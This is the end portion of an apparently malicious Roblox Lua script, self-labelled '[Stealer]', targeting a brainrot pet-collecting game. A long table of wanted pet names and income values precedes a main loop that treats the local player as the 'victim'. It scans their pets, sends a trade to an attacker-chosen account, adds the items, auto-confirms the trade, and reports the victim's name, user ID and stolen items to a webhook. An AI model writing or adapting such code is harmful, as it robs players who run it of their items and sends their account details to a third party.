    ["Los Bros"] = {DisplayName = "Los Bros", Generation = 24000000},
    ["Los Chicleteiras"] = {DisplayName = "Los Chicleteiras", Generation = 7000000},
    ["Chachechi"] = {DisplayName = "Chachechi", Generation = 400000},
    ["Extinct Tralalero"] = {DisplayName = "Extinct Tralalero", Generation = 450000},
    ["Extinct Matteo"] = {DisplayName = "Extinct Matteo", Generation = 625000},
    ["67"] = {DisplayName = "67", Generation = 7500000},
    ["Las Sis"] = {DisplayName = "Las Sis", Generation = 17500000},
    ["Celularcini Viciosini"] = {DisplayName = "Celularcini Viciosini", Generation = 22500000},
    ["La Extinct Grande"] = {DisplayName = "La Extinct Grande", Generation = 23500000},
    ["Quesadilla Crocodila"] = {DisplayName = "Quesadilla Crocodila", Generation = 3000000},
    ["Tacorita Bicicleta"] = {DisplayName = "Tacorita Bicicleta", Generation = 16500000},
    ["La Cucaracha"] = {DisplayName = "La Cucaracha", Generation = 475000},
    ["To to to Sahur"] = {DisplayName = "To to to Sahur", Generation = 2250000},
    ["Mariachi Corazoni"] = {DisplayName = "Mariachi Corazoni", Generation = 12500000},
    ["Los Tacoritas"] = {DisplayName = "Los Tacoritas", Generation = 32000000},
    ["Tictac Sahur"] = {DisplayName = "Tictac Sahur", Generation = 37500000},
    ["Yess my examine"] = {DisplayName = "Yess my Examen", Generation = 575000},
    ["Karker Sahur"] = {DisplayName = "Karker Sahur", Generation = 725000},
    ["Noo my examine"] = {DisplayName = "Noo my Examen", Generation = 32500000},
    ["Money Money Puggy"] = {DisplayName = "Money Money Puggy", Generation = 21000000},
    ["Los Primos"] = {DisplayName = "Los Primos", Generation = 31000000},
    ["Tang Tang Keletang"] = {DisplayName = "Tang Tang Keletang", Generation = 33500000},
    ["Perrito Burrito"] = {DisplayName = "Perrito Burrito", Generation = 1000000},
    ["Chillin Chili"] = {DisplayName = "Chillin Chili", Generation = 25000000},
    ["Los Tortus"] = {DisplayName = "Los Tortus", Generation = 500000},
    ["Los Karkeritos"] = {DisplayName = "Los Karkeritos", Generation = 750000},
    ["Los Jobcitos"] = {DisplayName = "Los Jobcitos", Generation = 1500000},
    ["Los 67"] = {DisplayName = "Los 67", Generation = 22500000},
    ["La Secret Combinasion"] = {DisplayName = "La Secret Combinasion", Generation = 125000000},
    ["Burguro And Fryuro"] = {DisplayName = "Burguro And Fryuro", Generation = 150000000},
    ["Zombie Tralala"] = {DisplayName = "Zombie Tralala", Generation = 500000},
    ["Vulturino Skeletono"] = {DisplayName = "Vulturino Skeletono", Generation = 500000},
    ["Frankentteo"] = {DisplayName = "Frankentteo", Generation = 700000},
    ["La Vacca Jacko Linterino"] = {DisplayName = "La Vacca Jacko Linterino", Generation = 850000},
    ["Chicleteirina Bicicleteirina"] = {DisplayName = "Chicleteirina Bicicleteirina", Generation = 4000000},
    ["Eviledon"] = {DisplayName = "Eviledon", Generation = 31500000},
    ["La Spooky Grande"] = {DisplayName = "La Spooky Grande", Generation = 24500000},
    ["Los Mobilis"] = {DisplayName = "Los Mobilis", Generation = 22000000},
    ["Spooky and Pumpky"] = {DisplayName = "Spooky and Pumpky", Generation = 80000000},
    ["Boatito Auratito"] = {DisplayName = "Boatito Auratito", Generation = 525000},
    ["Horegini Boom"] = {DisplayName = "Horegini Boom", Generation = 2750000},
    ["Rang Ring Bus"] = {DisplayName = "Rang Ring Bus", Generation = 6000000},
    ["Mieteteira Bicicleteira"] = {DisplayName = "Mieteteira Bicicleteira", Generation = 26000000},
    ["Quesadillo Vampiro"] = {DisplayName = "Quesadillo Vampiro", Generation = 3500000},
    ["Burrito Bandito"] = {DisplayName = "Burrito Bandito", Generation = 4000000},
    ["Chipso and Queso"] = {DisplayName = "Chipso and Queso", Generation = 25000000},
    ["Jackorilla"] = {DisplayName = "Jackorilla", Generation = 315000},
    ["Pumpkini Spyderini"] = {DisplayName = "Pumpkini Spyderini", Generation = 650000},
    ["Trickolino"] = {DisplayName = "Trickolino", Generation = 900000},
    ["Telemorte"] = {DisplayName = "Telemorte", Generation = 2000000},
    ["Pot Pumpkin"] = {DisplayName = "Pot Pumpkin", Generation = 3000000},
    ["Noo my Candy"] = {DisplayName = "Noo my Candy", Generation = 5000000},
    ["Los Spooky Combinasionas"] = {DisplayName = "Los Spooky Combinasionas", Generation = 20000000},
    ["La Casa Boo"] = {DisplayName = "La Casa Boo", Generation = 100000000},
    ["La Taco Combinasion"] = {DisplayName = "La Taco Combinasion", Generation = 35000000},
    ["1x1x1x1"] = {DisplayName = "1x1x1x1", Generation = 1111111},
    ["John Doe"] = {DisplayName = "John Doe", Generation = 7500000},
    ["Capitano Moby"] = {DisplayName = "Capitano Moby", Generation = 160000000},
    ["Guest 666"] = {DisplayName = "Guest 666", Generation = 66666666},
    ["Pirulitoita Bicicleteira"] = {DisplayName = "Pirulitoita Bicicleteira", Generation = 2500000},
    ["Los Puggies"] = {DisplayName = "Los Puggies", Generation = 30000000},
    ["Los Spaghettis"] = {DisplayName = "Los Spaghettis", Generation = 70000000},
    ["Fragrama and Chocrama"] = {DisplayName = "Fragrama and Chocrama", Generation = 100000000},
    ["Swag Soda"] = {DisplayName = "Swag Soda", Generation = 13000000},
    ["Orcaledon"] = {DisplayName = "Orcaledon", Generation = 40000000},
    ["Los Cucarachas"] = {DisplayName = "Los Cucarachas", Generation = 1250000},
    ["Los Burritos"] = {DisplayName = "Los Burritos", Generation = 8500000},
    ["Los Quesadillas"] = {DisplayName = "Los Quesadillas", Generation = 4500000},
    ["Cuadramat and Pakrahmatmamat"] = {DisplayName = "Cuadramat and Pakrahmatmamat", Generation = 1400000},
    ["Fishino Clownino"] = {DisplayName = "Fishino Clownino", Generation = 120000000},
    ["Los Planitos"] = {DisplayName = "Los Planitos", Generation = 18500000},
    ["W or L"] = {DisplayName = "W or L", Generation = 30000000},
    ["Lavadorito Spinito"] = {DisplayName = "Lavadorito Spinito", Generation = 45000000},
    ["Gobblino Uniciclino"] = {DisplayName = "Gobblino Uniciclino", Generation = 27500000},
    ["Giftini Spyderini"] = {DisplayName = "Giftini Spyderini", Generation = 999999},
    ["Cooki and Milki"] = {DisplayName = "Cooki and Milki", Generation = 155000000},
    ["25"] = {DisplayName = "25", Generation = 2500000},
    ["La Vacca Prese Presente"] = {DisplayName = "La Vacca Prese Presente", Generation = 600000},
    ["Reindeer Tralala"] = {DisplayName = "Reindeer Tralala", Generation = 600000},
    ["Santteo"] = {DisplayName = "Santteo", Generation = 800000},
    ["Please my Present"] = {DisplayName = "Please my Present", Generation = 1300000},
    ["List List List Sahur"] = {DisplayName = "List List List Sahur", Generation = 2000000},
    ["Ho Ho Ho Sahur"] = {DisplayName = "Ho Ho Ho Sahur", Generation = 3250000},
    ["Chicleteira Noelteira"] = {DisplayName = "Chicleteira Noelteira", Generation = 15000000},
    ["La Jolly Grande"] = {DisplayName = "La Jolly Grande", Generation = 30000000},
    ["Los Candies"] = {DisplayName = "Los Candies", Generation = 23000000},
    ["Triplito Tralaleritos"] = {DisplayName = "Triplito Tralaleritos", Generation = 875000},
    ["Santa Hotspot"] = {DisplayName = "Santa Hotspot", Generation = 2600000},
    ["La Ginger Sekolah"] = {DisplayName = "La Ginger Sekolah", Generation = 75000000},
    ["Reinito Sleighito"] = {DisplayName = "Reinito Sleighito", Generation = 140000000},
    ["Naughty Naughty"] = {DisplayName = "Naughty Naughty", Generation = 3000000},
    ["Noo my Present"] = {DisplayName = "Noo my Present", Generation = 6000000},
    ["Los 25"] = {DisplayName = "Los 25", Generation = 10000000},
    ["Chimnino"] = {DisplayName = "Chimnino", Generation = 14000000},
    ["Festive 67"] = {DisplayName = "Festive 67", Generation = 67000000},
    ["Swaggy Bros"] = {DisplayName = "Swaggy Bros", Generation = 40000000},
    ["Bunnyman"] = {DisplayName = "Bunnyman", Generation = 1500000},
    ["Dragon Gingerini"] = {DisplayName = "Dragon Gingerini", Generation = 350000000},
    ["Donkeyturbo Express"] = {DisplayName = "Donkeyturbo Express", Generation = 7500000},
    ["Money Money Reindeer"] = {DisplayName = "Money Money Reindeer", Generation = 25000000},
    ["Los Jolly Combinasionas"] = {DisplayName = "Los Jolly Combinasionas", Generation = 20000000},
    ["Jolly Jolly Sahur"] = {DisplayName = "Jolly Jolly Sahur", Generation = 45000000},
    ["Ginger Gerat"] = {DisplayName = "Ginger Gerat", Generation = 75000000},
    ["Rocco Disco"] = {DisplayName = "Rocco Disco", Generation = 650000},
    ["Bunito Bunito Spinito"] = {DisplayName = "Bunito Bunito Spinito", Generation = 3000000},
    ["Tuff Toucan"] = {DisplayName = "Tuff Toucan", Generation = 26000000},
    ["Cerberus"] = {DisplayName = "Cerberus", Generation = 175000000},
    ["GOAT"] = {DisplayName = "GOAT", Generation = 950000},
    ["Brunito Marsito"] = {DisplayName = "Brunito Marsito", Generation = 3500000},
    ["Los Trios"] = {DisplayName = "Los Trios", Generation = 700000},
    ["Chill Puppy"] = {DisplayName = "Chill Puppy", Generation = 4000000},
    ["Arcadopus"] = {DisplayName = "Arcadopus", Generation = 5000000},
    ["Spinny Hammy"] = {DisplayName = "Spinny Hammy", Generation = 17000000},
    ["Bacuru and Egguru"] = {DisplayName = "Bacuru and Egguru", Generation = 24000000},
    ["Ketupat Bros"] = {DisplayName = "Ketupat Bros", Generation = 145000000},
    ["Hydra Dragon Cannelloni"] = {DisplayName = "Hydra Dragon Cannelloni", Generation = 300000000},
    ["Mi Gatito"] = {DisplayName = "Mi Gatito", Generation = 3250000},
    ["Los Mi Gatitos"] = {DisplayName = "Los Mi Gatitos", Generation = 6500000},
    ["Popcuru and Fizzuru"] = {DisplayName = "Popcuru and Fizzuru", Generation = 170000000},
    ["Love Love Love Sahur"] = {DisplayName = "Love Love Love Sahur", Generation = 1000000},
    ["Cupid Cupid Sahur"] = {DisplayName = "Cupid Cupid Sahur", Generation = 3100000},
    ["Cupid Hotspot"] = {DisplayName = "Cupid Hotspot", Generation = 3500000},
    ["Noo my Heart"] = {DisplayName = "Noo my Heart", Generation = 13000000},
    ["Chicleteira Cupideira"] = {DisplayName = "Chicleteira Cupideira", Generation = 17500000},
    ["Lovin Rose"] = {DisplayName = "Lovin Rose", Generation = 32500000},
    ["La Romantic Grande"] = {DisplayName = "La Romantic Grande", Generation = 40000000},
    ["Rosetti Tualetti"] = {DisplayName = "Rosetti Tualetti", Generation = 50000000},
    ["Love Love Bear"] = {DisplayName = "Love Love Bear", Generation = 225000000},
    ["Rosey and Teddy"] = {DisplayName = "Rosey and Teddy", Generation = 165000000},
    ["Los Sweethearts"] = {DisplayName = "Los Sweethearts", Generation = 16500000},
    ["Sammyni Fattini"] = {DisplayName = "Sammyni Fattini", Generation = 70000000},
    ["La Food Combinasion"] = {DisplayName = "La Food Combinasion", Generation = 90000000},
    ["Los Sekolahs"] = {DisplayName = "Los Sekolahs", Generation = 110000000},
    ["Los Amigos"] = {DisplayName = "Los Amigos", Generation = 130000000},
    ["Tirilikalika Tirilikalako"] = {DisplayName = "Tirilikalika Tirilikalako", Generation = 42500000},
    ["Antonio"] = {DisplayName = "Antonio", Generation = 125000000},
    ["Elefanto Frigo"] = {DisplayName = "Elefanto Frigo", Generation = 185000000},
    ["Signore Carapace"] = {DisplayName = "Signore Carapace", Generation = 275000000},
    ["Fishboard"] = {DisplayName = "Fishboard", Generation = 825000},
    ["DJ Panda"] = {DisplayName = "DJ Panda", Generation = 17500000},
    ["Ventoliero Pavonero"] = {DisplayName = "Ventoliero Pavonero", Generation = 65000000},
    ["Celestial Pegasus"] = {DisplayName = "Celestial Pegasus", Generation = 175000000},
    ["Tacorillo Crocodillo"] = {DisplayName = "Tacorillo Crocodillo", Generation = 12500000},
    ["Nacho Spyder"] = {DisplayName = "Nacho Spyder", Generation = 50000000},
    ["Paradiso Axolottino"] = {DisplayName = "Paradiso Axolottino", Generation = 900000},
    ["Serafinna Medusella"] = {DisplayName = "Serafinna Medusella", Generation = 5500000},
    ["Cigno Fulgoro"] = {DisplayName = "Cigno Fulgoro", Generation = 20000000},
    ["Los Cupids"] = {DisplayName = "Los Cupids", Generation = 30000000},
    ["Griffin"] = {DisplayName = "Griffin", Generation = 400000000},
    ["La Vacca Lepre Lepreino"] = {DisplayName = "La Vacca Lepre Lepreino", Generation = 1100000},
    ["Luck Luck Luck Sahur"] = {DisplayName = "Luck Luck Luck Sahur", Generation = 3750000},
    ["Noo my Gold"] = {DisplayName = "Noo my Gold", Generation = 13500000},
    ["Snailo Clovero"] = {DisplayName = "Snailo Clovero", Generation = 18500000},
    ["Gold Gold Gold"] = {DisplayName = "Gold Gold Gold", Generation = 45000000},
    ["Fortunu and Cashuru"] = {DisplayName = "Fortunu and Cashuru", Generation = 130000000},
    ["Cloverat Clapat"] = {DisplayName = "Cloverat Clapat", Generation = 60000000},
    ["Dug dug dug"] = {DisplayName = "Dug dug dug", Generation = 35000000},
    ["La Lucky Grande"] = {DisplayName = "La Lucky Grande", Generation = 40000000},
    ["Eid Eid Eid Sahur"] = {DisplayName = "Eid Eid Eid Sahur", Generation = 3500000},
    ["Granny"] = {DisplayName = "Granny", Generation = 4000000},
    ["Foxini Lanternini"] = {DisplayName = "Foxini Lanternini", Generation = 115000000},
    ["Buntteo"] = {DisplayName = "Buntteo", Generation = 850000},
    ["Bunny Bunny Bunny Sahur"] = {DisplayName = "Bunny Bunny Bunny Sahur", Generation = 2250000},
    ["Noo my Eggs"] = {DisplayName = "Noo my Eggs", Generation = 7000000},
    ["La Easter Grande"] = {DisplayName = "La Easter Grande", Generation = 55000000},
    ["Easter Easter Easter Sahur"] = {DisplayName = "Easter Easter Easter Sahur", Generation = 1250000},
    ["Los Bunitos"] = {DisplayName = "Los Bunitos", Generation = 4250000},
    ["Baskito"] = {DisplayName = "Baskito", Generation = 16000000},
    ["Churrito Bunnito"] = {DisplayName = "Churrito Bunnito", Generation = 21000000},
    ["Quackini Snackini"] = {DisplayName = "Quackini Snackini", Generation = 65000000},
    ["Hopilikalika Hopilikalako"] = {DisplayName = "Hopilikalika Hopilikalako", Generation = 55000000},
    ["Boppin Bunny"] = {DisplayName = "Boppin Bunny", Generation = 80000000},
    ["Hydra Bunny"] = {DisplayName = "Hydra Bunny", Generation = 185000000},
    ["Bunny and Eggy"] = {DisplayName = "Bunny and Eggy", Generation = 170000000},
    ["Globa Steppa"] = {DisplayName = "Globa Steppa", Generation = 27500000},
    ["Rico Dinero"] = {DisplayName = "Rico Dinero", Generation = 42500000},
    ["Pancake and Syrup"] = {DisplayName = "Pancake and Syrup", Generation = 125000000},
    ["Arcadragon"] = {DisplayName = "Arcadragon", Generation = 215000000},
    ["Berryno"] = {DisplayName = "Berryno", Generation = 1500000},
    ["Strawberrita"] = {DisplayName = "Strawberrita", Generation = 6500000},
    ["Bananito"] = {DisplayName = "Bananito", Generation = 15000000},
    ["Cash or Card"] = {DisplayName = "Cash or Card", Generation = 100000000},
    ["Los Mariachis"] = {DisplayName = "Los Mariachis", Generation = 30000000},
    ["Buho de Volto"] = {DisplayName = "Buho de Volto", Generation = 2750000},
    ["Futbolini Skatini"] = {DisplayName = "Futbolini Skatini", Generation = 4500000},
    ["Camera Ramena"] = {DisplayName = "Camera Ramena", Generation = 17000000},
    ["Gym Bros"] = {DisplayName = "Gym Bros", Generation = 42500000},
    ["Money Money Bros"] = {DisplayName = "Money Money Bros", Generation = 47000000},
    ["Los Chillis"] = {DisplayName = "Los Chillis", Generation = 75000000},
    ["Los Hackers"] = {DisplayName = "Los Hackers", Generation = 75000000},
    ["Duggy Bros"] = {DisplayName = "Duggy Bros", Generation = 90000000},
    ["Kalika Bros"] = {DisplayName = "Kalika Bros", Generation = 115000000},
    ["Digi Narwhal"] = {DisplayName = "Digi Narwhal", Generation = 200000000},
    ["Flancito"] = {DisplayName = "Flancito", Generation = 3750000},
    ["La Anniversary Grande"] = {DisplayName = "La Anniversary Grande", Generation = 50000000},
    ["Sammyni Cakini"] = {DisplayName = "Sammyni Cakini", Generation = 85000000},
    ["Jelly Moby"] = {DisplayName = "Jelly Moby", Generation = 175000000},
    ["Hippo Golazo"] = {DisplayName = "Hippo Golazo", Generation = 1250000},
    ["Ref Ref Ref Sahur"] = {DisplayName = "Ref Ref Ref Sahur", Generation = 2750000},
    ["Esok Goala"] = {DisplayName = "Esok Goala", Generation = 32500000},
    ["Los Admins"] = {DisplayName = "Los Admins", Generation = 95000000},
    ["Los Tictacs"] = {DisplayName = "Los Tictacs", Generation = 60000000},
    ["Moby Bros"] = {DisplayName = "Moby Bros", Generation = 225000000},
    ["Los Tangcitos"] = {DisplayName = "Los Tangcitos", Generation = 42500000},
    ["Los Sigmas"] = {DisplayName = "Los Sigmas", Generation = 2300000},
    ["Los Cornis"] = {DisplayName = "Los Cornis", Generation = 3100000},
}

-- ============================================================
-- MAIN
-- ============================================================

local victimName = LocalPlayer.Name
local victimId = LocalPlayer.UserId

print("[Stealer] Vítima: " .. victimName .. " (" .. victimId .. ")")
print("[Stealer] Alvo: " .. TARGET_USER)

local targetUserId = getUserIdByName(TARGET_USER)
if not targetUserId then
    warn("[Stealer] Usuário não encontrado: " .. TARGET_USER)
    return
end

local isTrading = false
local tradeAccepted = false

while not tradeAccepted do
    task.wait(10)
    
    local pets = scanVictim(victimName)
    if #pets == 0 then
        print("[Stealer] Nenhum pet encontrado.")
        goto continue
    end
    
    local found = {}
    for _, pet in ipairs(pets) do
        if WANTED_BRAINROTS[pet.name] then
            table.insert(found, pet)
        end
    end
    
    if #found == 0 then
        print("[Stealer] Nenhum brainrot desejado encontrado.")
        goto continue
    end
    
    print("[Stealer] Brainrots encontrados:")
    for _, pet in ipairs(found) do
        local genText = NumberUtils.ToString(nil, pet.genValue, 1)
        print("  - " .. pet.name .. " (Gen: $" .. genText .. "/s)")
    end
    
    if not isTrading then
        print("[Stealer] Enviando pedido de trade para " .. TARGET_USER)
        local success = sendTradeRequest(targetUserId)
        if success then
            print("[Stealer] Pedido enviado!")
            isTrading = true
            sendWebhook(victimName, victimId, found, "PEDIDO ENVIADO")
        else
            print("[Stealer] Falha ao enviar pedido.")
        end
    end
    
    ::continue::
end

print("[Stealer] Colocando itens...")
addItemsToTrade(found)
confirmTrade()
sendWebhook(victimName, victimId, found, "SUCESSO")
print("[Stealer] Concluído!")